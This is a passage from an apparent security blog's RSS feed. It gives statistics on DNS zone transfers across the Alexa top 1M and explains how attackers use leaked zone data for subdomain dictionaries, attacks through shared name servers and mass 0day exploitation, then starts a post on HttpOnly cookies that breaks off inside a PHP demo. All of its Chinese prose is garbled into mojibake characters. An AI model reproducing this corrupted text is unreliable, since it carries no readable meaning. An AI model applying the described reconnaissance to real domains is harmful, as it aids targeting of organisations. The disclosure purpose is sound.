Êèê‰æõ‰∫ÜÂÖ®ÁêÉÊéíÂêçÂâç‰∏ÄÁôæËê¨ÂêçÁöÑÁ∂≤Á´ôË≥áÊñô&lt;/a&gt;ÔºåÊàëÂÄëÂ∞±‰ª•ÈÄô‰ªΩË≥áÊñôÁÇ∫Âü∫Á§é‰æÜÂÅö‰∏Ä‰∫õÁµ±Ë®àÂêßÔºÅ&lt;/p&gt;

&lt;h3 id=&quot;ÊúâÂïèÈ°åÁöÑ-domain-Á∏ΩÊï∏ËàáÊØî‰æã&quot;&gt;ÊúâÂïèÈ°åÁöÑ domain Á∏ΩÊï∏ËàáÊØî‰æã&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;79133ÔºåÁ¥Ñ‰ΩîÊâÄÊúâÂèóÊ∏¨ÁõÆÊ®ôÁöÑ 8.014%&lt;/li&gt;
  &lt;li&gt;‰∏äËø∞ domain ÁöÑÊâÄÊúâ zone file ÂÖ±Âê´Êúâ 22631804 Á≠Ü DNS Ë®òÈåÑ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Áî±ÊñºÂú® Alexa Top 1M ‰∏≠ÊúâË®±Â§öË≥áÊñôÊòØÈáçË§áÁöÑ domainÔºåÂè¶Â§ñ‰πüÊúâ‰∫õË≥áÊñôÊòØ IPÔºåÂú®Êú¨Ê¨°ÁöÑÊ™¢Ê∏¨Áï∂‰∏≠ÈÉΩ‰∏çÂàóÂÖ•Ë®àÁÆóÔºåÂõ†Ê≠§ÂèóÊ∏¨ domain Á∏ΩÊï∏ÂÉÖÊúâ 987447 ÂÄãÔºåËÄåÈùû‰∏ÄÁôæËê¨ÂÄã„ÄÇÂè¶Â§ñÔºåÊú¨Ê¨°ÊéÉÊèèÁÇ∫Ê±ÇÂø´ÈÄüÁäßÁâ≤‰∫ÜÈÉ®ÂàÜÊ∫ñÁ¢∫ÁéáÔºåÂõ†Ê≠§ÂØ¶ÈöõÊï∏ÈáèÊáâÊØî 79133 Êõ¥Â§ö„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ÊúâÂïèÈ°åÁöÑ-top-level-domain-tld-Êï∏Èáè&quot;&gt;ÊúâÂïèÈ°åÁöÑ Top-Level Domain (TLD) Êï∏Èáè&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;ÂÖ®‰∏ñÁïå TLD Á∏ΩÊï∏Ôºö567&lt;/li&gt;
  &lt;li&gt;ÂèóÊ∏¨ÁõÆÊ®ôÁöÑ TLD Á∏ΩÊï∏Ôºö316Ôºå‰ΩîÂÖ®‰∏ñÁïåÁ∏ΩÊï∏ÁöÑ 55.73%&lt;/li&gt;
  &lt;li&gt;Êúâ zone transfer ÂïèÈ°åÁöÑ TLD Á∏ΩÊï∏Ôºö220Ôºå‰ΩîÂèóÊ∏¨ÁõÆÊ®ôÁöÑ 69.62%&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÁõÆÂâç TLD Á∏ΩÊï∏ÁöÑÊï∏ÊìöÂèñËá™Êñº &lt;a href=&quot;https://data.iana.org/TLD/tlds-alpha-by-domain.txt&quot;&gt;Internet Assigned Numbers Authority (IANA)&lt;/a&gt;Ôºå‰∏ç‰∫ÜËß£ TLD ÊòØ‰ªÄÈ∫ºÁöÑ‰∫∫ÂèØ‰ª•ÂèÉËÄÉ&lt;a href=&quot;http://en.wikipedia.org/wiki/Top-level_domain&quot;&gt;ÈÄôÁØáÁ∂≠Âü∫ÁôæÁßëÊñáÁ´†&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊúâË∂£ÁöÑÊòØÔºåÈÄ£‰∏Ä‰∫õÊñ∞ÁöÑ TLD ÈÉΩÊúâ zone transfer ÂïèÈ°åÔºå‰æãÂ¶Ç .technology„ÄÅ.museum Á≠âÁ≠âÔºåÂèØË¶ãÈÄôÁúüÁöÑÂæàÂÆπÊòìË¢´Â§ßÂÆ∂ÂøΩÁï•ÔΩû&lt;/p&gt;

&lt;h3 id=&quot;ÈóúÊñºÂêÑÂÄã-tld-ÁöÑÁµ±Ë®àÊï∏Êìö&quot;&gt;ÈóúÊñºÂêÑÂÄã TLD ÁöÑÁµ±Ë®àÊï∏Êìö&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Transferable domain in this TLDÔºöÂú®ÁâπÂÆö TLD ‰∏≠ÔºåÊúâÂ§öÂ∞ë domain ÂèØ‰ªªÊÑèÂü∑Ë°å zone transfer&lt;/li&gt;
  &lt;li&gt;Same TLD in Alexa top 1MÔºöÁâπÂÆö TLD Âú®Êú¨Ê¨° 987447 ÂÄãÂèóÊ∏¨ÁõÆÊ®ô‰∏≠ÊâÄ‰ΩîÁöÑÊï∏Èáè&lt;/li&gt;
  &lt;li&gt;Percentage of same TLD in Alexa top 1MÔºöÁâπÂÆö TLD Âú® Alexa top 1M ÂÖßÊâÄÊúâÂêåÊ®£ TLD ÊâÄ‰ΩîÁöÑÁôæÂàÜÊØîÔºà‰æãÔºö.com Âç≥ÁÇ∫ 35230 / 527203 = 6.68%Ôºâ&lt;/li&gt;
  &lt;li&gt;Percentage of all transferable domainÔºöÊüêÁâπÂÆö TLD ÂèØ‰ªªÊÑèÂü∑Ë°å zone transfer ÁöÑÊï∏ÈáèÂú®Êú¨Ê¨°ÊâÄÊúâÂèØ‰ªªÊÑèÂü∑Ë°å zone transfer ÊâÄÂç†ÁöÑÁôæÂàÜÊØîÔºà‰æãÔºö.com Âç≥ÁÇ∫ 35230 / 79133 = 44.52%Ôºâ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Áî±ÊñºÂéüÂßãÊï∏ÊìöÂ§™Â§öÔºåÂõ†Ê≠§Êú¨ÊñáÂÉÖÂàóÂá∫Ââç 25 Âêç„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-TLD.png&quot; title=&quot;Zone Transfer ÂïèÈ°åÁöÑ TLD Áõ∏ÈóúÁµ±Ë®à&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-TLD.png&quot; alt=&quot;Zone Transfer ÂïèÈ°åÁöÑ TLD Áõ∏ÈóúÁµ±Ë®à&quot; title=&quot;Zone Transfer ÂïèÈ°åÁöÑ TLD Áõ∏ÈóúÁµ±Ë®à&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;.tw Á∂≤ÂüüÊéíÁ¨¨‰∫åÂçÅ‰∏ÄÂêçÔºåÂπ∏Â•ΩÈÄôÊ¨°‰∏çÊòØ‰∏ñÁïåÁ¨¨‰∏Ä‰∫ÜÔºåÂê¶ÂâáÂèàÊòØÂè¶È°ûÁöÑÂè∞ÁÅ£‰πãÂÖâ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÈóúÊñº-name-server-ÁöÑÁµ±Ë®àÊï∏Êìö&quot;&gt;ÈóúÊñº name server ÁöÑÁµ±Ë®àÊï∏Êìö&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Number of domainÔºöË©≤Âè∞ name server ÊúâÂ§öÂ∞ë domain ÂèØ‰ªªÊÑèÂü∑Ë°å zone transfer&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Áî±ÊñºÂéüÂßãÊï∏ÊìöÂ§™Â§öÔºåÂõ†Ê≠§Êú¨ÊñáÂÉÖÂàóÂá∫Ââç 25 Âêç„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-name-server.png&quot; title=&quot;Zone Transfer ÂïèÈ°åÁöÑ name server Áõ∏ÈóúÁµ±Ë®à&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-name-server.png&quot; alt=&quot;Zone Transfer ÂïèÈ°åÁöÑ name server Áõ∏ÈóúÁµ±Ë®à&quot; title=&quot;Zone Transfer ÂïèÈ°åÁöÑ name server Áõ∏ÈóúÁµ±Ë®à&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ÂèØÂü∑Ë°å zone transfer ‰∏î‰∏çÈáçË§áÁöÑ namer server ÂÖ±Êúâ 53830 ÂÄã&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;ÈóúÊñº-ip-‰ΩçÂùÄÁöÑÁµ±Ë®àÊï∏Êìö&quot;&gt;ÈóúÊñº IP ‰ΩçÂùÄÁöÑÁµ±Ë®àÊï∏Êìö&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Êúâ 7939172 ÂÄã‰∏çÈáçË§áÁöÑ IP ‰ΩçÂùÄ&lt;/li&gt;
  &lt;li&gt;Âú®ÂÖ®ÈÉ® IP ‰ΩçÂùÄ‰∏≠ÔºåÊúâ 704638 ÂÄãÊòØÁßÅÊúâ IP ‰ΩçÂùÄ&lt;/li&gt;
  &lt;li&gt;Âú®ÁßÅÊúâ IP ‰ΩçÂùÄ‰∏≠ÔºåÊúâ 598443 ÂÄãÊòØ 10. ÈñãÈ†≠Ôºå‰ΩîÊâÄÊúâ IP ‰ΩçÂùÄÁöÑ 7.538%Ôºå‰ΩîÁßÅÊúâ IP ‰ΩçÂùÄÁöÑ 84.929%&lt;/li&gt;
  &lt;li&gt;Âú®ÁßÅÊúâ IP ‰ΩçÂùÄ‰∏≠ÔºåÊúâ 66270 ÂÄãÊòØ 172.16~31 ÈñãÈ†≠Ôºå‰ΩîÊâÄÊúâ IP ‰ΩçÂùÄÁöÑ 0.835%Ôºå‰ΩîÁßÅÊúâ IP ‰ΩçÂùÄÁöÑ 9.405%&lt;/li&gt;
  &lt;li&gt;Âú®ÁßÅÊúâ IP ‰ΩçÂùÄ‰∏≠ÔºåÊúâ 39925 ÂÄãÊòØ 192.168 ÈñãÈ†≠Ôºå‰ΩîÊâÄÊúâ IP ‰ΩçÂùÄÁöÑ 0.503%Ôºå‰ΩîÁßÅÊúâ IP ‰ΩçÂùÄÁöÑ 5.666%&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;subdomain-ÁöÑÁµ±Ë®àÊï∏Êìö&quot;&gt;subdomain ÁöÑÁµ±Ë®àÊï∏Êìö&lt;/h3&gt;

&lt;p&gt;‰ª•‰∏ãÈÅ∏Âá∫‰∏Ä‰∫õÂ∏∏Ë¢´ÂÖ•‰æµËÄÖÁï∂‰ΩúÊîªÊìäÁõÆÊ®ôÁöÑ subdomain ‰æÜË®àÁÆóÂú® 22631804 Á≠Ü DNS Ë®òÈåÑ‰∏≠ÂàÜÂà•ÂêÑ‰Ωî‰∫ÜÂπæÁ≠ÜÔºåÊØèÂÄã subdomain ÂÖ±ÊúâÂÖ©ÂÄãÁµ±Ë®àÁµêÊûúÔºåÈÄóËôüÂ∑¶ÈÇäÁöÑÁµ±Ë®àÁµêÊûú‰ª£Ë°®‰ª•Ë©≤ subdomain ÈñãÈ†≠ÁöÑ DNS Ë®òÈåÑÔºå‰æãÂ¶Ç git.devco.re„ÄÇÈÄóËôüÂè≥ÈÇäÁöÑÁµ±Ë®àÁµêÊûúÂâáÂ∞áÂâçÂæåÊúâÊï∏Â≠óÁöÑ subdomain ‰πü‰∏Ä‰ΩµË®àÂÖ•Ôºå‰æãÂ¶Ç dns01.devco.re„ÄÅ01dns.devco.re„ÄÅ0dns001.devco.re Á≠âÁ≠â„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;ÁâàÊú¨ÊéßÂà∂&lt;/p&gt;

    &lt;p&gt;git: 583, 626&lt;/p&gt;

    &lt;p&gt;gitlab: 138, 138&lt;/p&gt;

    &lt;p&gt;svn: 1552, 1669&lt;/p&gt;

    &lt;p&gt;subversion: 71, 72&lt;/p&gt;

    &lt;p&gt;cvs: 284, 330&lt;/p&gt;

    &lt;p&gt;hg: 115, 331&lt;/p&gt;

    &lt;p&gt;mercurial: 18, 19&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ÈñãÁôºËàáÊ∏¨Ë©¶&lt;/p&gt;

    &lt;p&gt;test: 14691, 20001&lt;/p&gt;

    &lt;p&gt;dev: 8300, 10959&lt;/p&gt;

    &lt;p&gt;stage: 1329, 1628&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Ë≥áÊñôÂ∫´&lt;/p&gt;

    &lt;p&gt;db: 1190, 2537&lt;/p&gt;

    &lt;p&gt;database: 150, 302&lt;/p&gt;

    &lt;p&gt;sql: 2209, 3298&lt;/p&gt;

    &lt;p&gt;mysql: 4045, 4998&lt;/p&gt;

    &lt;p&gt;postgre: 11, 11&lt;/p&gt;

    &lt;p&gt;redis: 21, 33&lt;/p&gt;

    &lt;p&gt;mongodb: 6, 42&lt;/p&gt;

    &lt;p&gt;memcache: 13, 72&lt;/p&gt;

    &lt;p&gt;phpmyadmin: 455, 485&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ÂæåÂè∞ÁÆ°ÁêÜ&lt;/p&gt;

    &lt;p&gt;manager: 188, 222&lt;/p&gt;

    &lt;p&gt;staff: 481, 542&lt;/p&gt;

    &lt;p&gt;member: 331, 376&lt;/p&gt;

    &lt;p&gt;backend: 153, 177&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Á∑ö‰∏äÊúçÂãôÁõ∏Èóú&lt;/p&gt;

    &lt;p&gt;api: 1871, 2097&lt;/p&gt;

    &lt;p&gt;search: 1469, 10987&lt;/p&gt;

    &lt;p&gt;pic: 178, 293&lt;/p&gt;

    &lt;p&gt;img: 1775, 3517&lt;/p&gt;

    &lt;p&gt;service: 779, 959&lt;/p&gt;

    &lt;p&gt;payment: 225, 238&lt;/p&gt;

    &lt;p&gt;cache: 373, 627&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ÁßÅÊúâÊúçÂãô&lt;/p&gt;

    &lt;p&gt;erp: 275, 318&lt;/p&gt;

    &lt;p&gt;eip: 69, 80&lt;/p&gt;

    &lt;p&gt;log: 227, 414&lt;/p&gt;

    &lt;p&gt;nagios: 636, 736&lt;/p&gt;

    &lt;p&gt;mrtg: 458, 565&lt;/p&gt;

    &lt;p&gt;cgi: 194, 261&lt;/p&gt;

    &lt;p&gt;dns: 2634, 9085&lt;/p&gt;

    &lt;p&gt;ns: 12198, 63431&lt;/p&gt;

    &lt;p&gt;ftp: 197414, 199481&lt;/p&gt;

    &lt;p&gt;blog: 5074, 5446&lt;/p&gt;

    &lt;p&gt;mail: 238742, 254515&lt;/p&gt;

    &lt;p&gt;email: 2484, 2706&lt;/p&gt;

    &lt;p&gt;webmail: 24164, 25067&lt;/p&gt;

    &lt;p&gt;owa: 798, 888&lt;/p&gt;

    &lt;p&gt;autodiscover: 30462, 30466&lt;/p&gt;

    &lt;p&gt;vpn: 3152, 7025&lt;/p&gt;

    &lt;p&gt;sso: 398, 462&lt;/p&gt;

    &lt;p&gt;ssl: 709, 932&lt;/p&gt;

    &lt;p&gt;proxy: 1464, 2215&lt;/p&gt;

    &lt;p&gt;cms: 1320, 1696&lt;/p&gt;

    &lt;p&gt;crm: 1152, 1301&lt;/p&gt;

    &lt;p&gt;forum: 3654, 4037&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Êåâ-end-ÁöÑ‰∫∫ÊúâÁ¶è‰∫Ü&quot;&gt;Êåâ End ÁöÑ‰∫∫ÊúâÁ¶è‰∫Ü&lt;/h3&gt;

&lt;p&gt;Á©∂Á´üÁ∂ìÁî± zone transfer ÊâÄÂæóÂà∞ÁöÑË≥áÊñôÂèØ‰ª•Êãø‰æÜÂÅö‰ªÄÈ∫ºÔºüÂ∞çÊñºÊîªÊìäËÄÖËÄåË®ÄÔºå‰∏ªË¶ÅÊúâ‰ª•‰∏ã‰∏âÁ®ÆÂà©Áî®ÊñπÂºèÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Âª∫Á´ãÂ≠óÂÖ∏Ê™îÔºöÂÖ•‰æµËÄÖÂèØÂà©Áî®‰∏äËø∞Ë≥áÊñôÂª∫Á´ã‰∏Ä‰ªΩÊúÄÂ∏∏Ë¶ãÁöÑ subdomain ÁöÑÂ≠óÂÖ∏Ê™îÔºåÊú™‰æÜÂà©Áî®Ê≠§Â≠óÂÖ∏Ê™îÈÄ≤Ë°åÊéÉÊèèÊôÇÂèØÁØÄÁúÅË®±Â§öÊôÇÈñìÊàêÊú¨ÔºåÂø´ÈÄüÊ™¢Ê∏¨ÊüêÈñìÂÖ¨Âè∏ÊúâÂì™‰∫õ subdomain&lt;/li&gt;
  &lt;li&gt;ÊóÅÊï≤ÂÅ¥ÊìäÔºöÂÖ•‰æµËÄÖÂèØËßÄÂØüÂì™‰∫õ name server ÊúâÈñãÊîæ zone transfer Êü•Ë©¢ÔºåÊé•ËëóÂéªËíêÈõÜÈÇÑÊúâÂì™‰∫õÂÖ¨Âè∏‰ΩøÁî®Âêå‰∏ÄÂè∞ name serverÔºåÂÜçÈÄ≤‰∏ÄÊ≠•ÊéÉÁûÑÈÇ£‰∫õ domain„ÄÇÈÇ£‰∫õ domain ‰πüË®±‰∏çÊòØÂ§ßÂÖ¨Âè∏„ÄÅ‰∏çÂú® Alexa top 1M ÂÖßÔºå‰ΩÜ‰Ω†ÁÑ°Ê≥ïÁ¢∫‰øùÂÆÉÊ∞∏ÈÅ†‰∏çÊúÉÊòØÂÖ•‰æµËÄÖÁöÑÊîªÊìäÁõÆÊ®ô„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁµêÂêà 0day ÈÄ≤Ë°åÊîªÊìäÔºöÁï∂ÊüêÂÄãÁ¨¨‰∏âÊñπÂ•ó‰ª∂Ë¢´Êè≠Èú≤ 0day Âº±ÈªûÊôÇÔºåÊìÅÊúâ‰∏äËø∞Ë≥áÊñôÁöÑ‰∫∫Â∞±ÂèØ‰ª•ËøÖÈÄüÂü∑Ë°åÂ§ßÁØÑÂúçÁöÑÊîªÊìä„ÄÇ‰æãÂ¶Ç&lt;a href=&quot;http://www.cvedetails.com/cve/CVE-2013-0156/&quot;&gt;ÈÄôÂπæÂπ¥Ê≠£Â§ØÁöÑ Rails Âú®ÂéªÂπ¥Ë¢´ÁàÜÂá∫Êúâ Remote Code Exection Âº±Èªû CVE-2013-0156&lt;/a&gt;ÔºåÂÖ•‰æµËÄÖÂèØÁõ¥Êé•Â∞çÊâÄÊúâ redmine ÈÄ≤Ë°åÊîªÊìä„ÄÇ&lt;a href=&quot;http://www.cvedetails.com/cve/CVE-2014-3412/&quot;&gt;Juniper VPN Âú®‰ªäÂπ¥‰πüË¢´Êè≠Èú≤ Remote Code Execution Âº±Èªû&lt;/a&gt;ÔºåÂÖ•‰æµËÄÖÂèØÊâæÂ∞ãÊâÄÊúâ vpn subdomain ‰æÜÈÄ≤Ë°åÂòóË©¶„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Âú®‰∏äÊ¨°ÊàëÂÄëÊèêËµ∑ÈÄôÂÄãÂè§ËÄÅÁöÑÂº±ÈªûÂæåÔºåÂ∑≤Á∂ìÊúâÈÉ®ÂàÜÂè∞ÁÅ£‰ºÅÊ•≠Èô∏Á∫åÂ∞áÊ≠§ÂïèÈ°å‰øÆÂæ©Ôºå‰ΩÜË®±Â§öÂè∞ÁÅ£‰ºÅÊ•≠‰ªçÊúâÊ≠§ÂïèÈ°åËÄå‰∏çËá™Áü•Ôºå‰πüË®±ÈÅéÈô£Â≠êÊàëÂÄëÁõ¥Êé•ÂÅöÂÄã Wall of Shame Ê¢ùÂàóÂá∫Âì™‰∫õÂª†ÂïÜÊúâÂïèÈ°åÊúÉËÆìÂ§ßÂÆ∂ÊØîËºÉÊúâÊÑü :p&lt;/p&gt;

&lt;p&gt;‰∏çÈÅé‰πüÂà•ÊÄ•ËëóÁ¨ëÂè∞ÁÅ£‰ºÅÊ•≠ÔºåË®±Â§öÂúãÈöõÁ¥öÁöÑÂ§ßÁ∂≤Á´ôÂêåÊ®£‰πüÊúâÊ≠§È°ûÂïèÈ°å„ÄÇÁî±Ê≠§ÂèØË¶ãË≥áÂÆâÂïèÈ°å‰∏çÂàÜÊñ∞Ëàä„ÄÅ‰∏çÂàÜÂúãÂÖßÂ§ñÔºåÁ∏ΩÊòØÂÆπÊòìË¢´Â§ßÂÆ∂ÂøΩÁï•ÔºåÁ≠âÂà∞‰∏çÁü•‰∏çË¶∫Ë¢´ÂÖ•‰æµËÄÖÊçÖ‰∫ÜÈáçÈáçÁöÑ‰∏ÄÂàÄÂæåÔºåÊâçÈ©öË¶∫ÈÄôË®±Â§öÁöÑÂ∞èÂº±Èªû‰∏ÄÊó¶‰∏≤Ëµ∑‰æÜÊòØÂ§öÈ∫ºÁöÑÂèØÊÄï„ÄÇ‰Ω†ÔºåÈñãÂßãÊúâÊâÄË≠¶Ë¶∫‰∫ÜÂóéÔºü&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/13/zone-transfer-statistics-of-alexa-top-1m/</link>
                <guid>https://devco.re/blog/2014/06/13/zone-transfer-statistics-of-alexa-top-1m</guid>
                <pubDate>Fri, 13 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HttpOnly - HTTP Headers ÁöÑË≥áÂÆâË≠∞È°å (3)</title>
                <description>&lt;p&gt;‰∏äÊ¨°ÊàëÂÄëÊèêÂà∞‰∫Ü &lt;a href=&quot;https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/&quot;&gt;Content-Security-Pilicy&lt;/a&gt;ÔºåÈÄôÊ¨°ÊàëÂÄë‰æÜËÅäËÅäÂêåÊ®£ÊòØÁÇ∫‰∫ÜÈò≤Á¶¶ XSS ËÄåÁîüÁöÑÂè¶‰∏ÄÂÄãÊäÄË°ì„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;httponly-Á∞°‰ªã&quot;&gt;HttpOnly Á∞°‰ªã&lt;/h3&gt;

&lt;p&gt;Cookie ÁöÑÊ¶ÇÂøµÈõñÁÑ∂Êó©Âú® 1994 Âπ¥Â∞±Áî± Netscape ÁöÑÂ∑•Á®ãÂ∏´ Montulli ÊèêÂá∫Ôºå‰ΩÜÁï∂ÊôÇ‰ªçÊú™ÊúâÂÆåÂñÑÁöÑÈò≤Ë≠∑Ê©üÂà∂ÔºåÂÉèÊòØ HttpOnly„ÄÅSecure Á≠âË¶èÁØÑÈÉΩÊòØÂæå‰æÜÈô∏Á∫åË¢´ÊèêÂá∫ÔºåÁõ¥Âà∞ 2011 Âπ¥ 4 ÊúàÊâçÂú® &lt;a href=&quot;http://tools.ietf.org/html/rfc6265&quot;&gt;RFC 6265&lt;/a&gt; ‰∏≠Ê≠£ÂºèÂÆöÊ°à„ÄÇËÄåÂÖ∂‰∏≠ÁöÑ &lt;a href=&quot;https://www.owasp.org/index.php/HttpOnly&quot;&gt;HttpOnly&lt;/a&gt; ÊòØÂ∞àÈñÄÁÇ∫‰∫ÜÊäµÁ¶¶ÊîªÊìäËÄÖÂà©Áî® Cross-Site Scripting (XSS) ÊâãÊ≥ï‰æÜÁõúÂèñÁî®Êà∂Ë∫´‰ªΩÔºåÊ≠§È†Ö Cookie Èò≤Ë≠∑Ë®≠ÂÆöÊáâË©≤ÊòØÂú® HTTP Headers Á≥ªÂàóÊñá‰∏≠ÊúÄÂª£ÁÇ∫‰∫∫Áü•ÁöÑÈ†ÖÁõÆ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;httponly-‰∏ªË¶Å‰ΩúÁî®&quot;&gt;HttpOnly ‰∏ªË¶Å‰ΩúÁî®&lt;/h3&gt;

&lt;p&gt;Ë™™Êòé HttpOnly ‰∏ªË¶Å‰ΩúÁî®‰πãÂâçÔºåÂÖàË´áË´á XSS ÊúÄÂ∏∏Ë¶ãÁöÑÂà©Áî®ÊñπÂºè„ÄÇXSS ÊîªÊìäÊó©Âú® 1990 Âπ¥Â∞±Ë¢´ÁôºÁèæÔºåÊ≠§ÊîªÊìäÊâãÊ≥ïÊúÄÂ∏∏Ë¶ãÁöÑÂà©Áî®ÊñπÂºèÊòØÂ≠òÂèñ‰ΩøÁî®ËÄÖÁöÑ cookie ‰æÜÁç≤Âæó‰∏Ä‰∫õÊ©üÊïèË≥áÊñô„ÄÇÂÉèÊòØÂ≠òÂèñ session cookie Âç≥ÂèØÁõúÁî®‰ΩøÁî®ËÄÖÁöÑË∫´‰ªΩÔºàÈóúÊñº session ÁöÑÈáçË¶ÅÊÄßÔºåÂèØ‰ª•ÂèÉËÄÉÊàëÂÄëÈÉ®ËêΩÊ†ºÁöÑÂè¶‰∏ÄÁØáÊñáÁ´† &lt;a href=&quot;https://devco.re/blog/2014/06/03/http-session-protection/&quot;&gt;HTTP Session ÊîªÊìäËàáÈò≤Ë≠∑&lt;/a&gt;ÔºâÔºåÂ¶ÇÊûúÂú® cookie ‰∏≠Ë®òÈåÑ‰∫ÜÂÖ∂‰ªñÊ©üÊïèË≥áË®äÔºå‰πüÂèØËÉΩÊúÉ‰∏Ä‰ΩµÈÅ≠Á´ä„ÄÇÂõ†Ê≠§Ëã•ËÉΩÈòªÊ≠¢ÊîªÊìäËÄÖÂ≠òÂèñÂ∏∂ÊúâÊïèÊÑüË≥áÊñôÁöÑ cookieÔºåÂ∞±ËÉΩÊ∏õÂ∞ë XSS Â∞ç‰ΩøÁî®ËÄÖÁöÑÂΩ±ÈüøÔºåÂõ†ËÄåÂÇ¨Áîü‰∫Ü HttpOnly Ê©üÂà∂„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Áï∂ cookie ÊúâË®≠ÂÆö HttpOnly flag ÊôÇÔºåÁÄèË¶ΩÂô®ÊúÉÈôêÂà∂ cookie Âè™ËÉΩÁ∂ìÁî± HTTP(S) ÂçîÂÆö‰æÜÂ≠òÂèñ„ÄÇÂõ†Ê≠§Áï∂Á∂≤Á´ôÊúâ XSS Âº±ÈªûÊôÇÔºåËã• cookie Âê´Êúâ HttpOnly flagÔºåÂâáÊîªÊìäËÄÖÁÑ°Ê≥ïÁõ¥Êé•Á∂ìÁî± JavaScript Â≠òÂèñ‰ΩøÁî®ËÄÖÁöÑ session cookieÔºåÂèØÈôç‰Ωé‰ΩøÁî®ËÄÖË∫´‰ªΩË¢´ÁõúÁî®ÁöÑÊ©üÁéá„ÄÇÊó©ÊúüÊúâ‰∫õÁÄèË¶ΩÂô®Êú™ÂÆåÊï¥ÂØ¶‰Ωú HttpOnly ÊâÄÊúâÂäüËÉΩÔºåÂõ†Ê≠§ÊîªÊìäËÄÖ‰ªçÂèØÈÄèÈÅé XMLHttpRequest ËÆÄÂèñ cookieÔºå‰ΩÜÊúÄËøëÂπæÂπ¥ÂêÑÂ§ßÁÄèË¶ΩÂô®‰πüÈô∏Á∫åÈòªÊìã‰∫ÜÈÄôÂÄãÊñπÂºè„ÄÇÂõ†Ê≠§ HttpOnly ÂèØÊúâÊïàÈôç‰Ωé XSS ÁöÑÂΩ±Èüø‰∏¶ÊèêÂçáÊîªÊìäÈõ£Â∫¶„ÄÇÁõÆÂâçÁÄèË¶ΩÂô®ÁöÑÊîØÊè¥ÂàóË°®Â¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-browser-support-list.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-browser-support-list.png&quot; alt=&quot;HttpOnly ÁÄèË¶ΩÂô®ÊîØÊè¥ÂàóË°®&quot; title=&quot;HttpOnly ÁÄèË¶ΩÂô®ÊîØÊè¥ÂàóË°®&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÂÖ∂‰ªñÁÄèË¶ΩÂô®ÊîØÊè¥ÂàóË°®‰ª•ÂèäÂêÑÂÆ∂Á®ãÂºèË™ûË®Ä‰ΩøÁî® HttpOnly ÁöÑÊñπÂºèÂèØÂèÉËÄÉ &lt;a href=&quot;https://www.owasp.org/index.php/HttpOnly&quot;&gt;OWASP HttpOnly&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;httponly-demo&quot;&gt;HttpOnly Demo&lt;/h3&gt;

&lt;p&gt;‰ª•‰∏ã‰ΩøÁî® PHP Á®ãÂºèÁ¢ºÁÇ∫‰æãÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;HttpOnly Demo&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
